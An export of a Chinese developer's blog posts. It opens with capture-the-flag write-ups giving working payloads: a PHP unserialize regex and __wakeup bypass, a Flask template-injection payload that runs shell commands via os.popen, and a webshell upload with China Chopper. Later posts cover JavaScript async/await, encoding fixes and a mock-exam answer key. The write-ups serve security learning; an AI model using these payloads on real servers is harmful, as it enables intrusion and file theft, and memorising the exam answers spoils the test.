解题过程先审计一下代码，执行过程是从 17 行开始。 123456789101112131415161718192021222324252627&lt;?php class Demo { private $file = 'index.php'; public function __construct($file) { $this-&gt;file = $file; } function __destruct() { echo @highlight_file($this-&gt;file, true); } function __wakeup() { if ($this-&gt;file != 'index.php') { //the secret is in the fl4g.php $this-&gt;file = 'index.php'; } } }if (isset($_GET['var'])) { $var = base64_decode($_GET['var']); if (preg_match('/[oc]:\\d+:/i', $var)) { die('stop hacking!'); } else { @unserialize($var); } } else { highlight_file(&quot;index.php&quot;); } ?&gt; 代码审计首先得用 GET 传入 var ，不然的话就高亮 index.php 文件源码 （25行） 123456if (isset($_GET['var'])) { } else { // 高亮 index.php 的源码，效果就是题目描述的截图 highlight_file(&quot;index.php&quot;); } 接着对传入的 var 变量进行 base64 解码 1$var = base64_decode($_GET['var']); 解码后进行 正则匹配 ，匹配到的话直接结束（die）并显示 stop hacking! 12345if (preg_match('/[oc]:\\d+:/i', $var)) { die('stop hacking!'); } else { @unserialize($var); } 如果没匹配到就反序列化 (后面再解释啥是 序列化 和 反序列化)。 Q: 反序列化啥呢？ A: 明显是要反序列化 2-16 行的 Demo 对象 首先如果构造Demo类，会 执行 __construct 方法，将传入的 $file 赋值给本地的私有方法 $file。请给私有画上重点，后面个巨坑跟这个私有有关系。 销毁时执行 __destruct 方法，高亮本地变量 file 文件的代码 123456789101112131415class Demo { private $file = 'index.php'; public function __construct($file) { $this-&gt;file = $file; } function __destruct() { echo @highlight_file($this-&gt;file, true); } function __wakeup() { if ($this-&gt;file != 'index.php') { //the secret is in the fl4g.php $this-&gt;file = 'index.php'; } } } Q: 那 __wakeup 这个方法是干吗用的？ A: 当 反序列化构造这个类 时执行 __wakeup 方法，会将本地变量 file 重新设置为 file 还有个注释，明示了 flag 在 fl4g.php 文件 序列化和反序列化 在php中，序列化用与存储或传递php的值的过程，同时不丢失其结构和数据类型。 若被反序列化的变量是一个对象，在成功重新构造对象之后，PHP会自动地试图去调用__wakeup()魔术方法（如果存在的话） 例子 1234567891011121314151617181920212223class User { public $name; private $male; protected $money = 1000; public function __construct($data, $male) { $this-&gt;data = $data; $this-&gt;male = $male; }}$number = 66;$str = 'jerry';$bool = true;$null = NULL;$arr = array('a' =&gt; 1, 'b' =&gt; 2);$user = new User('tom', true);var_dump(serialize($number));var_dump(serialize($str));var_dump(serialize($bool));var_dump(serialize($null));var_dump(serialize($arr));var_dump(serialize($user)); 输出结果 123456string(5) &quot;i:66;&quot; string(12) &quot;s:5:&quot;jerry&quot;;&quot; string(4) &quot;b:1;&quot; string(2) &quot;N;&quot; string(30) &quot;a:2:{s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;i:2;}&quot; string(93) &quot;O:4:&quot;User&quot;:4:{s:4:&quot;name&quot;;N;s:10:&quot;Usermale&quot;;b:1;s:8:&quot;*money&quot;;i:1000;s:4:&quot;data&quot;;s:3:&quot;tom&quot;;}&quot; 更多关于序列化的资料请参考 php 序列化与反序列化 获取 flag构造 序列化根据注释的明示直接访问 fl4g.php ，果然是一片空白。 不过证明的确实有这个文件，并且 flag 就存在这个文件的代码中，需要我们使用 highlight_file 方法来显示出来。 构造 Demo 类，传入 $file = fl4g.php ，然后反序列化 123456789101112131415161718192021222324&lt;?phpclass Demo { private $file = 'index.php'; public function __construct($file) { $this-&gt;file = $file; } function __destruct() { echo @highlight_file($this-&gt;file, true); } function __wakeup() { if ($this-&gt;file != 'index.php') { //the secret is in the fl4g.php $this-&gt;file = 'index.php'; } } }$file = 'fl4g.php';$demo = new Demo($file);$s = serialize($demo);print_r($s);echo(&quot;&lt;br&gt;&quot;);print_r(base64_encode($s));?&gt; 可以使用 在线php 方便的调试 php 代码 http://www.dooccn.com/php/ 得到结果序列化结果： O:4:&quot;Demo&quot;:1:{s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;} base64 编码后： Tzo0OiJEZW1vIjoxOntzOjEwOiIARGVtbwBmaWxlIjtzOjg6ImZsNGcucGhwIjt9 绕过正则匹配直接传进去，果然被匹配到了 不清楚正则匹配的话，在这个网站上(regextester)可以知道匹配到的部分是前面的 O:4: 可以在 4 前面加上 + 来绕过，因为在 php 语法中，+4 = 4 12345print(4);print(&quot;&lt;br&gt;&quot;);print(+4);print(&quot;&lt;br&gt;&quot;);print(-4); 利用漏洞，绕过 __wakeup传入绕过正则匹配并编码后的载荷： 1var?=TzorNDoiRGVtbyI6MTp7czoxMDoiRGVtbyAgZmlsZSI7czo4OiJmbDRnLnBocCI7fQ 果不其然的显示回 index.php 的源码了。 这是因为 反序列化 Demo 对象后调用了 __wakeup 方法，重新将传入的 fl4g.php 设置为 index.php 了 123456function __wakeup() { if ($this-&gt;file != 'index.php') { //the secret is in the fl4g.php $this-&gt;file = 'index.php'; } } 这个时候就要提到著名的反序列化漏洞了。 在之前，O:4:&quot;Demo&quot;:1:{s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;} 中的 :1: 是代表这个对象中有一个属性，上面的 序列化和反序列化 的最后一个例子也是同理，只不过在构造方法中多了一个 data 属性，所以是 4 。 __wakeup 漏洞就是与整个属性个数值有关。当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过 __wakeup 的执行。 因此最后的序列化是： O:+4:&quot;Demo&quot;:2:{s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;} 编码后： TzorNDoiRGVtbyI6Mjp7czoxMDoiRGVtb2ZpbGUiO3M6ODoiZmw0Zy5waHAiO30= 载荷是： 1var?=TzorNDoiRGVtbyI6Mjp7czoxMDoiRGVtb2ZpbGUiO3M6ODoiZmw0Zy5waHAiO30= 巨坑-私有属性结果居然还是 index.php 的源码！！！ WTF ??? 经过多方百度后，发现了一个盲点——由于 Demo 类的 file 属性是私有属性序列化之后，在类名前后会有 %00 阻断。 并且在 s:10:&quot;Demofile&quot; 也有提示，Demofile 是 8 个字符，为什么是 s:10 呢？就是因为前后有 %00 图形化就是这样： %44%65%6d%6f进行 hex 转化后 就是 Demo ，可以在这个网站上测试 Hex编码/解码 坑来了： 如果直接复制文本样式，在别的地方进行base64编码会丢失掉 %00 的信息！！再 解码-&gt;反序列化 自然与我之前序列化的 Demo 不是同一个东西 Q: 那咋办呢？ A: 在 php 中就把替换和base64编码弄好！ 执行以下代码： 12345678910111213141516171819202122232425262728293031&lt;?phpclass Demo{ private $file = 'index.php'; public function __construct($file) { $this-&gt;file = $file; } function __destruct() { echo @highlight_file($this-&gt;file, true); } function __wakeup() { if ($this-&gt;file != 'index.php') { //the secret is in the fl4g.php $this-&gt;file = 'index.php'; } }}$file = 'fl4g.php';$d = new Demo($file);$s = serialize($d);// O:4:&quot;Demo&quot;:1:{s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;}$s = str_replace(':1:', ':2:', $s);$s = str_replace('O:4', 'O:+4', $s);print_r($s);print_r(&quot;&lt;br&gt;&quot;);print_r(base64_encode($s)); 使用了 str_replace 方法来进行替换 这样编码后的结果就还是带有 %00 的了： TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ== 载荷 1?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ== 0x02 - 技术总结 __wakeup 方法是反序列化后调用的方法，可以利用超属性的方法来绕过 在 php 中 4 = +4 ，可以用来绕过正则匹配 私有属性序列化后会在属性名前加上类名，类名左右会带上 %00 0x03 - 参考链接：攻防世界 Web_php_unserialize的坑 php 序列化与反序列化 __wakeup()函数漏洞以及实际漏洞分析 [wp] 攻防世界 Web_php_unserialize","link":"/post/60542.html"},{"title":"攻防世界 WEB Web_python_template_injection","text":"0x00 - 题目描述 0x01 - 解题过程打开是单一网页，注释中也没有其他提示。 通过百度得知，是要利用 flask 模板的代码注入漏洞。就例如下面这种 这是某大神已经写好的远程执行漏洞，在popen里填入指令就行了。 1234567891011{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__ == 'catch_warnings' %} {% for b in c.__init__.__globals__.values() %} {% if b.__class__ == {}.__class__ %} {% if 'eval' in b.keys() %} {{ b['eval']('__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()') }} {% endif %} {% endif %} {% endfor %}{% endif %}{% endfor %} 效果如下 0x02 - 技术总结这道题属于 SSTI——服务端模板注入攻击 ，其实在 Chrome 的 Hackbar 中有测试载荷。 SSTI 读取文载荷 1[].__class__.__base__.__subclasses__()[40]('fl4g').read()","link":"/post/57753.html"},{"title":"攻防世界 WEB upload1","text":"0x00 - 题目描述 0x01 - 解题过程打开页面，只有一个上传模块 既然题目是 uplaod1 那就可以试一下上传一句话木马。 下面就是一句话木马的内容，只要上传到服务器后，就可以用工具连接控制服务器了。 选择完木马文件之后果然被阻止了，上传按钮不可用了。 分析 js 代码，是把按钮给 disable 了。 那很简单，在 html 里吧 disable 删掉就可以继续上传了 得到上传的地址。访问地址没有404，说明正常打开了。 使用中国菜刀连接。 能访问服务器文件。开始找flag 一般不是在服务器的根目录就是在网站的根目录，这道题是后者 0x02 - 技术总结 注意看网页的源码","link":"/post/17040.html"},{"title":"教你从头到尾解决小程序回调地狱","text":"示例代码逻辑上有点小 bug ，但不影响。 由于历史原因，微信小程序的 异步API 大部分使用的都是 回调函数 或者 then() 的方法；虽然很直观，但是一旦逻辑复杂起来就会变成「屎山」。什么叫屎山？下面这个就叫屎山。 1234567891011121314151617181920212223242526272829303132333435363738394041424344// 忽略了 this.setData()setUserInfo(event) { const userInfos = wx.cloud.database().collection('userInfo') wx.getSetting({ success: (res) =&gt; { if (!!res.authSetting[&quot;scope.userInfo&quot;]) { wx.getUserInfo({ lang: 'zh_CN', success: (res) =&gt; { wx.cloud.callFunction({ name: 'getOpenId' }).then(res =&gt; { userInfos.where({ _openid: res.result.openId }).count().then(res =&gt; { if (res.total === 0) { userInfos.add({ data: event.detail.userInfo }).then(() =&gt; { wx.showToast({ title:'注册成功' }) wx.reLaunch({ url: '/pages/my/my', }) }) } else { wx.showToast({ title:'登录成功' }) wx.reLaunch({ url: '/pages/my/my', }) } }) }) }, }) } else { Toast.fail('请允许') } }, })}, 本文将通过 Promise对象 , async/await函数 从「简单」到「高级」的化解、切割、消灭屎山。（之后简称 Promise 和 async/await） 何来：什么是「异步」就是 刚入门的童鞋可能不清楚什么是异步，建议先看下面这篇文章初步的了解一下。 Javascript异步编程的4种方法 着重了解概念和第一，第四个方法即可 小程序有非常多的 异步API ，只要是提供了 回调函数 的，都可以视为是 异步API 在实际的业务中，经常需要根据上一个 API 的结果来执行下一个 API。与 回调函数 结合起来就形成下面这个屎山 的原因 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253setUserInfo(event) { const userInfos = wx.cloud.database().collection('userInfo') wx.getSetting({ success: (res) =&gt; { if (!!res.authSetting[&quot;scope.userInfo&quot;]) { wx.getUserInfo({ lang: 'zh_CN', success: (res) =&gt; { const userInfo = res.userInfo wx.cloud.callFunction({ name: 'getOpenId' }).then(res =&gt; { userInfos.where({ _openid: res.result.openId }).get().then(res =&gt; { if (res.total === 0) { userInfos.add({ data: userInfo }).then((res) =&gt; { userInfo._id = res._id userInfo._openid = _openid this.setData({ userInfo }) wx.showToast({ title: '注册成功' }) wx.reLaunch({ url: '/pages/my/my', }) }) } else { this.setData({ userInfo: res.data }) wx.showToast({ title: '注册成功' }) wx.reLaunch({ url: '/pages/my/my', }) } }) }) }, }) } else { Toast.fail('请允许') } }, }) wx.getUserInfo({ success: function (res) { console.log(res.userInfo) } })}, 回调函数写起来很爽，但是哪天你需要改变某个回调后的逻辑时；你就得像手剥洋葱含着泪一层一层的「剥开」它 既然 回调函数 这么麻烦，那么把回调的结果赋值给外面，或者把逻辑用方法分离出去不行吗？ 没等你异步函数执行回调，后面的代码就执行了，值都是undefined 抽象成方法「治标不治本」，改嵌套的还是嵌套了 天下苦回调久矣，所以就有了「事件监听」、「发布/订阅」、「Promises对象」等等的改良方法；但是他们都有各自的缺点。 直到五年前 Promise、async/await 的面世，JavaScript 的异步才算迎来了它的「终极解决」办法 English (中文)：Promise (承诺)、async (异步)、await (等待)。 Promises 对象可以看做 Promise 的前世，他们两个不是同一个东西 。 由于 Promise （ES6加入）和 async/await （ES7加入）太「新」了，需要 Babel 等转码器转码之后才能运行到旧浏览器。 vue-cli 的 build 和 小程序编译就是在干这件事 在 Nodejs 的 API 中使用的就是 发布/订阅 （事件）的异步方法，例如 fs 。 Node不支持 ES6 语法 可以使用 Babel转换来支持 ES6 化解：async / await 函数使用 async/await 可以简化 回调中的 then async 和 await 是 JavaScript 中的关键字，await 顾名思义就是 「等待」。 他的使用我直接举个例子吧，虽然微信小程序新 API 都提供了 Promise 对象的调用类型，但是使用 then() 还是会出现「嵌套」问题的： 123456789101112131415161718192021222324252627282930getUserInfo() { // 调用 getOpenId 云函数 获取 openid 之后查询数据库并将结果打印出来 wx.cloud.callFunction({ name: 'getOpenId' }).then(res =&gt; { userinfos.where({ openid: res.result.openid }).get().then(res =&gt; { console.log(res.data) }) })},// 使用 async / await 之后 async getUserInfo() { // 调用云函数获取 openid var openid = await wx.cloud.callFunction({ name: 'getOpenId' }) // 根据 openid 查询数据库中的用户信息 var res = await userinfos.where({ openid: openid.result.openid }).get() // 打印用户信息 console.log(res.data)}, 使用 async / await 之前， Promise 的结果只能在 then 里取到，然后再进行下一步操作； 使用 async / await 之后会将结果赋值给前面的变量，没赋值的话 await 也会等待异步执行完成才执行下一步。是不是有点像之前 「回调函数」里幻想的「赋值给外面」，从嵌套解构变成了个线性解构。 对了，不要以为 then 就没用了，它可以这样使用：返回只需要的值，简化后续的使用 12345678910111213141516171819async getUserInfo() { // 调用云函数获取 openid var openid = await wx.cloud.callFunction({ name: 'getOpenId' }).then(res =&gt; { return res.result.openid }) // 根据 openid 查询数据库中的用户信息 var userInfo = await userinfos.where({ openid }).get().then(res=&gt;{ return res.data }) // 打印用户信息 console.log(userInfo)}, 学会使用 async/await 之后，那坨屎山就是这个样子了 由于使用了async 标记了整个函数，整个函数已经是「异步」了，所以执行异步函数时页面并不会「假死」。 await 后面只能是 Promise ，标记使用 回调函数 的小程序的 API 是没有用的（目前来说）。 切割：用 Promise 「包装」 回调函数await 后面只能是 Promise ，标记使用「回调函数」的小程序的 API 是没有用的。 那么，对于 回调函数 就没有办法了吗。当然不是，不然 Promise 也不会被称为「终极解决」方法了。 这是获取用户设置的例子 12345wx.getSetting({ success(res) { console.log(res); }}) 可以使用 Promise 来「包装」这个 回调函数 。 当 success 回调函数执行到 resolve (解决) 这一行时，就会调用外层的 then()。 123456789new Promise((resolve) =&gt; { wx.getSetting({ success(res) { resolve(res) } })}).then(res =&gt; { console.log(res);}) 结合上面的 async/await ，「完美」解决了嵌套问题 12345678const res = await new Promise((resolve) =&gt; { wx.getSetting({ success(res) { resolve(res) } })})console.log(res); 不是所有回调函数都需要「包装」，当出现两层以上回调函数嵌套的，才推荐使用 Promise 进行 「包装」。简而言之：禁止过度「包装」 消灭： 微信API 支持 Promise在学会了使用 async/await 标记函数 和用 Promise 包装 异步API 之后，就再也没有被异步嵌套困扰过。 直到某天老师给的实验作业中出现了个意想不到的骚操作，之前需要「包装」的 API 可以直接使用 await 来等待回调，并将结果赋值给前面的变量。 原来在2月份的时候微信更新了一波。基础库 2.10.2 版本起，异步 API 支持 callback &amp; promise 两种调用方式 也就是说，之后再也不需要「包装」异步 API 了；因为已经支持 Promise 调用了。 不过实际感受并不是特别完善，开发者工具并没有进行适配。使用 await 会有警告。 并且没有片段提示 相比之下，云开发的 API 是有提示的 当然你可以使用 JSDoc 的 @type 来强行标记类型，是会有提示的。 所以，建议基础不太好的童鞋还是老老实实用「包装」的方法来解决回调嵌套比较好； 佛系更新的官方都支持 Promise 了，说明 异步API Promise 化这条路是正确的。 在官方更新 Promise 调用的片段（提示）前，萌新还是建议使用 Promise 「包装」异步API。毕竟拼写错误导致的报错的问题不是一次两次了，依赖片段提示可以极大的避免拼写错误。","link":"/post/37955.html"},{"title":"消失于互联网","text":"万万没想到，我重装系统的时候忘记备份 博客 文件夹了。之前的18篇文章全部火葬场了。还好之前部署到 GitHub Pages 的文章还在，我只需要重新弄配置文件就可以了。不过难受的是我的第一篇碎碎念忘记备份了，而我又在 hexo g -d 之前 删掉了仓库。就在这一系列迷迷糊糊的操作后，我的那篇客居异乡 4 点钟写的碎碎念，就这样永远的消失在了互联网。 以后只能在看到这篇文章的时候才能回忆起那分崩离析的情绪了。 摄于写碎碎念时，台风登陆前夕","link":"/post/62693.html"},{"title":"解决 GitHub 头像加载错误","text":"update in 1-17： 现在有更好的解决办法了，那就是 SwitchyOmega 最近发现 GitHub 的头像不能正常加载了，发现是404，直接就想到了是DNS污染。挂上全局酸酸乳，ping 加载失败的域名，得到 ip 地址，然后在 host 里加上就行了。 123# GitHub Start 151.101.108.133 avatars1.githubusercontent.com# GitHub End","link":"/post/13173.html"},{"title":"解决 IDEA 控制台乱码","text":"百度到的办法基本都试过了，只有一个有用。 在 Help -&gt; Edit Custom VM Options... 中的最后一行加上 1-Dfile.encoding=UTF-8 接着重启 IDEA 就 ok 了","link":"/post/62768.html"},{"title":"解决Window s Treminal 中 git bash 中文转义&#x2F;乱码","text":"在 git 安装目录下的 etc/bash.bashrc 文件中末尾添上这两行，保存重启 bash 即可 12export LANG=&quot;zh_CN.UTF-8&quot;export LC_ALL=&quot;zh_CN.UTF-8&quot; 这种在 status 里中文转义的输入以下指令并执行即可 1git config --global core.quotepath false","link":"/post/60086.html"},{"title":"解决微信小程序 Node 模块编译的各种问题","text":"小程序支持使用 npm 安装其他依赖或者模块来增强小程序的功能。我就使用 Vant UI 来作为我小程序的 UI 库但是我在使用中遇到了各种模块编译的问题 疑难杂症编译缓慢自从安装了 Vant UI 之后，每次编译都能在下面看到底部在解析 js 文件。编译时间也从之前的 1 秒变成现在的 4-5秒。 解决办法翻文档首先，作为一个成熟的框架，一定是可以设置主动忽略某些文件夹/文件的。翻文档是找到这个设置最直接的办法。 果不其然，在开发者工具搜索配置文件就找到了——Babel编译。这个应该就是导致编译变慢的罪魁祸首了。 改配置既然知道有这功能，就改改看看。 忽略某文件的 Babel 的编译，其实官方的示例就已经明示了，直接拿来用就行了 12345678910&quot;setting&quot;:{ //其他略 &quot;babelSetting&quot;: { &quot;ignore&quot;: [ &quot;miniprogram_npm/*&quot; ], &quot;disablePlugins&quot;: [], &quot;outputPath&quot;: &quot;&quot; }} 设置修改完成后，清除缓存，重启开发者工具。在调试器里的控制台中看到这个忽略日志就说明配置成功了","link":"/post/38725.html"},{"title":"Web前端中级证4道操作题模拟真题解析","text":"2月更新 害，理论 77；实操 93 。这真的是中级？这么简单 ==12月21日更新== 考完了，发现这题目比模拟题简单一百万倍。我实操题就空了一个空。 ==原文== 这个证的含金量是真的高，高到现在的我不配考到这个证，没有文档真做不出来大部分的。 不过代码的质量、可读性都很高，没有注释也可以看得懂，不像我，写了注释也读不懂 注意！不保证与真实的题目有关系。 本文随缘更新，题目来源是 2019-12-18 早上的模拟考试 四道题目源码+题目截图的打包的 下载 第一题题目 源码目录如下图： index.html : 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;TODO List&lt;/title&gt; &lt;style&gt; #todoList { list-style-type: none; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;ul id=&quot;todoList&quot;&gt;&lt;/ul&gt;&lt;script&gt;(() =&gt; { const todoList = document.querySelector('#todoList'); fetch('todo.php').then((res) =&gt; { if (res.(1) === 200) { &lt;!-- 此行中请填写第（1）空 --&gt; res.(2)().then((list) =&gt; { &lt;!-- 此行中请填写第（2）空 --&gt; list.forEach((item) =&gt; { let li = document.createElement('li'); let checkbox = document.createElement('input'); checkbox.type = 'checkbox'; checkbox.id = &quot;todo_&quot; + item.id; if (item.completed) { checkbox.checked = true; /* 当完成时将checkbox勾选上 */ } li.appendChild(checkbox); let label = document.createElement('label'); label.innerText = item.text; label.htmlFor = &quot;todo_&quot; + item.id; li.appendChild(label); todoList.appendChild(li); checkbox.addEventListener(&quot;click&quot;, function (e) { e.preventDefault(); let newStatus = this.checked ? 1 : 0; let data = new (3)(); &lt;!-- 此行中请填写第（3）空 --&gt; data.append('(4)', (5));//设置提交的参数 &lt;!-- 此行中请填写第（4）和第（5）空 --&gt; fetch('todo.php(6)' + item.id, { &lt;!-- 此行中请填写第（6）空 --&gt; '(7)': data, &lt;!-- 此行中请填写第（7）空 --&gt; '(8)': '(9)' &lt;!-- 此行中请填写第（8）和第（9）空 --&gt; }).then((res) =&gt; { if (res.status === 200) { res.json().then((json) =&gt; { if (json.(10)) { &lt;!-- 此行中请填写第（10）空 --&gt; alert(json.error) } else { checkbox.checked = !!newStatus; } }) } else { alert('操作异常') } }); }) }) }) } })})();&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; list.json : 1[{&quot;text&quot;:&quot;hello&quot;,&quot;completed&quot;:true,&quot;id&quot;:1},{&quot;text&quot;:&quot;world&quot;,&quot;completed&quot;:false,&quot;id&quot;:2}] todo.php : 123456789101112131415161718192021222324252627282930313233&lt;?phpheader('Content-Type:application/json');$dataFile = __DIR__ . '/list.json';switch ($_SERVER['REQUEST_METHOD']) { case 'GET': echo file_get_contents($dataFile); break; case 'POST': if (!isset($_GET['id'])) { echo json_encode(['errno' =&gt; 10001, 'error' =&gt; 'no id']); return; } $id = intval($_GET['id']); $list = json_decode(file_get_contents($dataFile), true); foreach ($list as &amp;$item) { if ($item['id'] === $id) { if (!isset($_POST['status'])){ echo json_encode(['errno' =&gt; 10002, 'error' =&gt; 'no status']); return; } $item['completed'] = boolval($_POST['status']); file_put_contents($dataFile, json_encode($list)); echo json_encode(['errno' =&gt; 0, 'error' =&gt; 'ok']); return; } } unset($item); echo json_encode(['errno' =&gt; 10003, 'error' =&gt; 'not found']); break; default: echo json_encode(['errno' =&gt; 20001, 'error' =&gt; 'unsupported method']);} 参考链接 JavaScript fetch 快速入门 ES6中fetch的post的前后端node传参的问题 FormData使用方法详解 答案及解析我是真没想到考证的 ajax 用的既不是 XMLHTTPRequest 也不是 JQuery 的 $.ajax 而是ES6中的 Ferch 第 1、2 空可以从42、43行中找到答案 直接就是点击复选框里面的事件了，先注释掉这个点击事件，看看1、2空有没有填对。 可以从 todo.php 里请求到json数据，页面显示也正常。 第 6 空回到3空，不知道要 new 什么，后面更不知道要填什么，总之可以看出是跟后台有数据交互就对了，那就去 todo.php 里找答案。 通过分析可知，修改列表需要用 POST 类型，同时还要用 GET 类型传入 id 这个值 用 GET 传入的参数肯定是在 URL 里的，并且6空后面还有 item.id 来拼接，所以6空的答案是 ?id= 第 7、8、9 空前面也说了，点击事件里的 fetch 是 POST类型 ，根据参考资料需要用传入 method: 'POST' 来指定是POST 类型 显而易见不可能是7空，因为后面有 data，所以只能填入8、9空。你问我为什么参考（其他地方）的 method 没有用单引号括起来，题目里的却括起来了？咱不知道，也不敢问。 那么7空毫无疑问就是 body 了 第 4、5 空在 index.html 里又没有思路了，接着看 todo.php ，传入 id 之后接着干了什么。 分析可知，POST传入的参数名是 status 回到 index.html 里，第37行里题目给的注释是：设置提交的参数。并且看到第35行将选中情况赋值给了常量 newStatus。 可以大胆猜测4、5空是 status 和 newStatus，如果不信，可以接着往下看。 第 3 空到现在还是不知道3空是什么，总之是用 append方法 添加数据的。实在不行，搜百度符合条件的就只有 FormData 了（具体用法见第三条参考链接） 所以3空应该填的是 FormData 第 10 空10空根据下面那行可以判断出填的应该是 error ，如果有 error(错误信息) 就用 alert方法 弹出错误信息。 至此，第一题解析完 第二题想查看题目和源码建议到本文顶部的下载中下载查看。 当时忘记保存数据库文件了，所以复原不了环境。但是问题不大此题与数据库没半毛钱关系。 或者是有其他问题吧 参考链接 1 空 通过 Composer 创建项目 2、3、4 空 Model 5、6 路由 7、8 表单验证 9、10 空 Blade 模板 答案及解析考的都是记忆力，就不多解析了。 第 1 空create-project 1234【问题1】基于Laravel框架，回答下列问题，填写（1）至（4）。1、包管理工具安装Laravel框架，需要使用Composer 工具：通过命令“composer （1） laravel/laravel --prefer-dist message”创建message工程。 第 2、3、4 空make:model 、 messages 、 table 第 5、6 空第 5 空是因为有前缀，并且里面还有个‘add‘，第 6 空是因为直接打开不是 post 方法 E 、 F 123456789101112【问题2】分析项目路由，回答下列问题，填写（5）至（6）。在浏览器中输入网址，访问留言板页面，用户填写留言内容后，点击“提交”按钮，通过POST方式提交表单，在路由文件web.php中，路由配置如下：&lt;?php//留言板首页Route::get('/', &quot;IndexController@index&quot;);//提交留言Route::prefix('message')-&gt;group(function ($app){ $app-&gt;post('add','IndexController@add');}); 项目发布在本机上，本机地址为localhost，根据web.php文件中定义的路由信息，当输入下列访问地址时，分析路由情况，选择相应A至F内容，填写（5）至（6）。 第 7、8 空vaildata 、max IndexController.php： 1234567891011121314151617181920212223242526272829&lt;?phpnamespace App\\Http\\Controllers;use App\\Message;use Illuminate\\Http\\Request;class IndexController extends Controller{ public function index() { $list = Message::all(); return view('index', ['list' =&gt; $list]); } public function add(Request $request) { $request-&gt;(7)([ /* 在此行中填写第（7）空 */ 'name'=&gt;'required|(8):16', /* 在此行中填写第（8）空 */ 'content'=&gt;'required' ]); $content = $request-&gt;get('content',''); $name = $request-&gt;get('name',''); $todo = new Message(); $todo-&gt;fill(['name'=&gt;$name,'content'=&gt;$content]); $todo-&gt;save(); return back(); }} 第 9、10空@yield 、**$loop-&gt;last** layout.balde.php: 12345678910111213141516171819&lt;html&gt;&lt;head&gt; &lt;title&gt;Message&lt;/title&gt; &lt;style&gt; time {color:#666} .author {color: #333} fieldset {margin-top:2em} &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;header&gt; &lt;h1&gt;Message board&lt;/h1&gt;&lt;/header&gt;&lt;div class=&quot;container&quot;&gt; (9)('content') /* 在此行中填写第（9）空 */&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; index.balde.php: 1234567891011121314151617181920212223@extends(&quot;layout&quot;)@section(&quot;content&quot;) @foreach($list as $item) &lt;div&gt; &lt;time&gt;{{$item['created_at']}}&lt;/time&gt; &lt;span class=&quot;author&quot;&gt;{{$item['name']}}&lt;/span&gt;&lt;br&gt; &lt;article&gt;{{$item['content']}}&lt;/article&gt; &lt;/div&gt; &lt;!-- 每条消息后面加一条分隔线，最后一条除外 --&gt; @if(!(10)) &lt;hr&gt; @endif /* 在此行中填写第（10）空 */ @endforeach &lt;fieldset&gt; &lt;legend&gt;New message&lt;/legend&gt; &lt;form method=&quot;POST&quot; action=&quot;/message/add&quot;&gt; @csrf &lt;p&gt;&lt;input type=&quot;text&quot; placeholder=&quot;Name&quot; name=&quot;name&quot; required&gt;&lt;/p&gt; &lt;p&gt;&lt;textarea type=&quot;text&quot; placeholder=&quot;Content&quot; name=&quot;content&quot; required&gt;&lt;/textarea&gt;&lt;/p&gt; &lt;p&gt;&lt;button type=&quot;submit&quot;&gt;Submit&lt;/button&gt;&lt;/p&gt; &lt;/form&gt; &lt;/fieldset&gt;@endsection 第三题答案及解析第 1 空可以在 meta 的补全里看到答案 第 2 空flex-md-column 第 3 、4 空很明显是模态框的按钮链接 modal 、 data-target 第 5 空实在不知道 ，百度都搜不出来，看老师给的答案是 modal-dialog-centered 话外题，百度是真的菜，搜出来的都是3的，或者自己diy的。我用Google搜，第一个就是正确答案 第 6、7、8很明显是用了 flex 布局，根据参考链接可以知道是 flex-direction、column、flex-grow 第 9 空linear-gradient 第 10 空看 todoForm ，是 form标签 ，因此可知是处理提交事件 submit 第 11、12 空val 、 trim 第 13 空append 第 14 空preventDefault 第 15 空closest 用的很有灵性 :checked 第四题第 1、2 空 id肯定是主键和自增，这个可以不用背。直接到 phpmyadmin 里新建表，然后预览SQL语句就可以了 PRIMARY KEY、AUTO_INCREMENT 第 3、4 空 mysqli是个连接数据库的对象 mysqli::__construct new、password 第 5、6 空 这两空就是白送分 session_start()、$query 第 7、8、9 空 第 7 空是填标识符，因为默认是 MYSQLI_BOTH 而题目让你填一个，并且结合短标签里指定了 id 还好 HbuildX 里有补全提示，只要记住前面的 MYSQLI 就行了 MYSQLI_ASSOC 标识符 返回结果 MYSQLI_ASSOC 关联数组 MYSQLI_NUM 数字数组 MYSQLI_BOTH 都返回(默认) 第 11 行的编号后面的期刊名，和第 1、2 空创建表的字段名，第 8 空是 $row[‘title’] 最后要关闭数据库连接 close() 第 10、11 空 两个送分题，ACTION 指定表单提交的地址， onsubmit 指定提交时处理的JavaScript方法，而这个页面就一个JavaScript方法 postAdd.php、checkpost() 第 12、13、14 空 因为在第 5 行用了之前在 conn.php 创建的 $mysqli 所以是第 12 空是 include ‘conn.php’ 不唯一，使用 include_once / requrire / requrire_once 都可以 需要验证是否有 $_POST 参数，所以第 13 空是 isset 第 14 空明显是MySQL插入数据，所以是 **INSERT INTO ** 第 15、16 空 在 list.php 里用 get方法 传入了 id 所以第 15 空填入 $_GET[‘id’] 第 16 空根据 name 可以知道是与 id 有关，参照下面的短连接，所以填 &lt;?=$rs[‘id’]&gt; 第 17、18 空 第 17 空明显是更新数据，所以是 **UPDATA journal SET ** 当第 4 行的 query 执行成功，会返回数据给 $result 因此第 18 空就是来判这个的 $result 第 19 空送分 $id 第 20 空 又是一道送分题 $url 总结怎么说呢，可能是没有接触过 ES6 标准的 JavaScript，总体来说四道题第一道题是最难的，越往后面做题目越简单。 虽然有些题目的空没有见过是真的填不出来的，但是也有几个空是送分的，有的是需要结合上下文推断出来的。 